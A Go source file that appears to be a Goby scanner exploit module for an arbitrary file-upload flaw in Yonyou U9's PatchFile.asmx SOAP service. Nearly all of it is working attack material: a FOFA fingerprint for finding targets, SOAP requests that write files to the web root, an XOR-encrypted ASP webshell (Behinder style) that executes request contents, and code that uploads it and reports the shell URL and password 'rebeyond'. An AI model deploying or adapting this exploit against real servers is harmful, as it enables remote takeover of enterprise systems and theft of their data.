package exploits

import (
	"encoding/base64"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YongYou-U9 PatchFile /CS/Office/AutoUpdates/PatchFile.asmx File Upload Vulnerability",
    "Description": "<p>U9 cloud focuses on medium-sized and medium-sized manufacturing enterprises, supports digital and intelligent manufacturing scenarios such as the integration of industry, finance and taxation, design and manufacturing, plan execution, marketing services, and project manufacturing, empowers organizational transformation and business innovation, integrates industrial Internet resources to achieve connection, sharing, and collaboration, and helps manufacturing enterprises develop with high quality.</p><p>The application has an arbitrary file upload interface in the foreground, which can construct a request package and upload a webshell file to control the server.</p>",
    "Product": "YongYou-U9",
    "Homepage": "https://u9cloud.yonyou.com/",
    "DisclosureDate": "2024-03-26",
    "PostTime": "2024-03-26",
    "Author": "兰公子",
    "FofaQuery": "body=\"images/logo-u9.png\"",
    "GobyQuery": "body=\"images/logo-u9.png\"",
    "Level": "3",
    "Impact": "<p>The application has an arbitrary file upload interface in the foreground, which can construct a request package and upload a webshell file to control the server.</p>",
    "Recommendation": "<p>Please go to the official website to upgrade to the latest version:<a href=\"https://u9cloud.yonyou.com/\">https://u9cloud.yonyou.com/</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/qJHwBfViBzH6agRzJqGo3Q"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "choose",
            "type": "select",
            "value": "default,customize",
            "show": ""
        },
        {
            "name": "customize",
            "type": "input",
            "value": "<%Response.CharSet = \"UTF-8\" :k=\"e45e329feb5d925b\":Session(\"k\")=k:size=Request.TotalBytes:content=Request.BinaryRead(size):For i=1 To size:result=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))):Next:execute(result)%>",
            "show": "choose=customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CS/Office/AutoUpdates/PatchFile.asmx",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "close",
                    "Content-Type": "text/xml; charset=utf-8"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n                <soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n                  <soap:Body>\n                    <SaveFile xmlns=\"http://tempuri.org/\">\n                      <binData>PCVSZXNwb25zZS5Xcml0ZSgidGVzdCIpOlNldCBmc289Q3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpOmZzby5EZWxldGVGaWxlKFNlcnZlci5NYXBQYXRoKFJlcXVlc3QuU2VydmVyVmFyaWFibGVzKCJTQ1JJUFRfTkFNRSIpKSkgJT4=</binData>\n                      <path>./</path>\n                      <fileName>test.asp</fileName>\n                    </SaveFile>\n                  </soap:Body>\n                </soap:Envelope>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/CS/Office/AutoUpdates/PatchFile.asmx"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/CS/Office/AutoUpdates/test.asp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "用友U9 PatchFile /CS/Office/AutoUpdates/PatchFile.asmx 文件上传漏洞",
            "Product": "用友U9",
            "Description": "<p>U9 cloud聚焦中型和中大型制造企业，支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。<br></p><p>该应用存在前台的任意文件上传接口，可构造请求包，上传webshell文件，从而控制服务器。<br></p>",
            "Recommendation": "<p>请前往官网升级至最新版本：<a href=\"https://u9cloud.yonyou.com/\" target=\"_blank\">https://u9cloud.yonyou.com/</a><br></p>",
            "Impact": "<p>该应用存在前台的任意文件上传接口，可构造请求包，上传webshell文件，从而控制服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "YongYou-U9 PatchFile /CS/Office/AutoUpdates/PatchFile.asmx File Upload Vulnerability",
            "Product": "YongYou-U9",
            "Description": "<p>U9 cloud focuses on medium-sized and medium-sized manufacturing enterprises, supports digital and intelligent manufacturing scenarios such as the integration of industry, finance and taxation, design and manufacturing, plan execution, marketing services, and project manufacturing, empowers organizational transformation and business innovation, integrates industrial Internet resources to achieve connection, sharing, and collaboration, and helps manufacturing enterprises develop with high quality.<br></p><p>The application has an arbitrary file upload interface in the foreground, which can construct a request package and upload a webshell file to control the server.<br></p>",
            "Recommendation": "<p>Please go to the official website to upgrade to the latest version:<a href=\"https://u9cloud.yonyou.com/\" target=\"_blank\">https://u9cloud.yonyou.com/</a><br></p>",
            "Impact": "<p>The application has an arbitrary file upload interface in the foreground, which can construct a request package and upload a webshell file to control the server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10938"
}`

	// 随机生成文件
	makeFileNameKash := func(fileType string) string {
		fileName := goutils.RandomHexString(16) + "." + fileType
		return fileName
	}

	// POST请求构造(请求url , data参数 , header参数(map))
	sendPayloadFlagPostKash := func(hostInfo *httpclient.FixUrl, urlOfPost string, dataOfPost string, postHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		postRequestConfigKash := httpclient.NewPostRequestConfig(urlOfPost)
		postRequestConfigKash.VerifyTls = false
		postRequestConfigKash.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range postHeaderMap {
			postRequestConfigKash.Header.Store(postHeaderKey, postHeaderValue)
		}
		postRequestConfigKash.Data = dataOfPost
		return httpclient.DoHttpRequest(hostInfo, postRequestConfigKash)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			choose := goutils.B2S(ss.Params["choose"])
			customize := goutils.B2S(ss.Params["customize"])
			password := "rebeyond"
			shell_type := "Behinder"
			fileName := makeFileNameKash("asp")

			//base64编码
			customizeBaes64 := base64.StdEncoding.EncodeToString([]byte(customize))

			postFirstResultOfMap := map[string]string{"Content-Type": "text/xml; charset=utf-8"}
			rsp, err := sendPayloadFlagPostKash(expResult.HostInfo, "/CS/Office/AutoUpdates/PatchFile.asmx", `<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveFile xmlns="http://tempuri.org/">
      <binData>`+customizeBaes64+`</binData>
        <path>./</path>
        <fileName>`+fileName+`</fileName>
      </SaveFile>
  </soap:Body>
</soap:Envelope>`, postFirstResultOfMap)
			if err != nil {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			if choose == "default" {
				expResult.Success = true
				expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/CS/Office/AutoUpdates/" + fileName + "\n"
				expResult.Output += "Password: " + password + "\n"
				expResult.Output += "WebShell tool: " + shell_type + "\n"
				return expResult
			}

			expResult.Success = true
			expResult.Output += "文件上传成功：WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/CS/Office/AutoUpdates/" + fileName + "\n"
			return expResult
		},
	))
}
